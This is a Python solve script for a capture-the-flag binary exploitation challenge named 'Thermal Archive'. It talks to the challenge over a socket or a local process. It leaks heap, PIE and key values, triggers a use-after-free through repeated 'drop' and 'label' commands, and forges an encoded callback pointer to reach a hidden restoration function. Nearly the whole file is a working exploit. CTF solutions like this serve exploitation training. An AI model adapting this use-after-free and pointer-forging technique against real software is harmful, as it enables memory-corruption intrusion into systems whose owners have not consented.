#!/usr/bin/env python3
"""Thermal Archive exploit: leak heap/PIE/key, UAF type confusion, sealed callback swap.
Usage: python3 solve_thermal_archive.py [HOST PORT]
Without HOST, runs the challenge ELF in the local extracted 'give' directory.
"""
import os
import re
import socket
import struct
import subprocess
import sys

U64 = lambda b: struct.unpack('<Q', b)[0]
P64 = lambda x: struct.pack('<Q', x & ((1<<64)-1))
rol = lambda x, n: ((x << n) | (x >> (64-n))) & ((1<<64)-1)
ORDINARY_OFF = 0x1c90
RESTORATION_OFF = 0x2170


def find_local_dir():
    base = os.path.dirname(os.path.abspath(__file__))
    override = os.environ.get('CHALLENGE_DIR')
    candidates = ([override] if override else [
        os.path.join(base, 'pwn_h_thermal_archive/give'),
        os.path.join(base, '../pwn_h_thermal_archive/give'),
        os.path.join(os.getcwd(), 'pwn_h_thermal_archive/give'),
        os.getcwd(),
    ])
    for path in candidates:
        if path and (os.path.isfile(os.path.join(path, 'challenge')) or
                     os.path.isfile(os.path.join(path, 'bin/challenge'))):
            return os.path.abspath(path)
    raise FileNotFoundError('No challenge found; set CHALLENGE_DIR to give/ or deploy/')

class IO:
    def __init__(self):
        if len(sys.argv) >= 3:
            self.sock = socket.create_connection((sys.argv[1], int(sys.argv[2])))
            self.proc = None
        else:
            target = find_local_dir()
            self.proc = subprocess.Popen(['./challenge' if os.path.isfile(os.path.join(target,'challenge')) else './bin/challenge'], cwd=target, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            self.sock = None
    def send(self, b):
        if self.sock: self.sock.sendall(b)
        else: self.proc.stdin.write(b); self.proc.stdin.flush()
    def read(self, n):
        if self.sock: return self.sock.recv(n)
        return os.read(self.proc.stdout.fileno(), n)
    def until(self, token):
        d = b''
        while not d.endswith(token):
            x = self.read(1)
            if not x: raise EOFError(f'closed while expecting {token!r}: {d!r}')
            d += x
        return d
    def cmd(self, x):
        self.send(x.encode() + b'\n')
        return self.until(b'archive> ')

io = IO()
io.until(b'archive> ')
page = io.cmd('page 41')
print('[+] Page:', page.decode(errors='replace').strip())
m = re.search(rb'page slot=(\d+) serial=(\d+) routing=([0-9a-f]{16})', page)
assert m
index, serial, routing = int(m[1]), int(m[2]), int(m[3], 16)
obj = ((routing ^ serial) >> 9) | (((routing ^ serial) & 0x1ff) << (64-9)) # ror64(p,9)
cab = obj - (32 + 128 * index)
print('[+] Cabinet heap @', hex(cab))
job = io.cmd(f'queue {index}')
print('[+] Queue:', job.decode(errors='replace').strip())
m = re.search(rb'job=(\d+) receipt=(\d+)', job)
assert m
j, receipt = int(m[1]), int(m[2])
assert b'shelf slot returned' in io.cmd(f'drop {index}')
assert b'label slot=' in io.cmd(f'label 32 {P64(cab).hex()}')
io.send(f'preview {j}\n'.encode())
head = io.until(b'proof 32\n')
header = b''
while len(header) < 32:
    header += io.read(32-len(header))
io.until(b'archive> ')
key, seq, ordinary, ribbon = struct.unpack('<QQQQ', header)
base = ordinary - ORDINARY_OFF
assert base & 0xfff == 0, (hex(ordinary), hex(base))
restore = base + RESTORATION_OFF
print(f'[+] key={key:#x} ribbon={ribbon:#x} ordinary={ordinary:#x} PIE={base:#x}')
print('[+] Restoration callback @', hex(restore))
required = rol((key+ribbon) & ((1<<64)-1),17) ^ 0x726573746f726521 ^ receipt
encoded = rol(restore ^ key,23)
assert b'shelf slot returned' in io.cmd(f'drop {index}')
# the payload overlays ink:8, finish:8, stamp:8 of the queued Page, and label WIDTH=0 changes length to zero.
# ink can be anything because produce reads 0 bytes.
forge = P64(cab) + P64(encoded) + P64(required)
assert b'label slot=' in io.cmd(f'label 0 {forge.hex()}')
output = io.cmd(f'print {j}')
print('[+] Print result:')
print(output.decode('utf-8','replace'))
assert b'--- recovered master roll ---' in output, 'EXPLOIT FAILED'
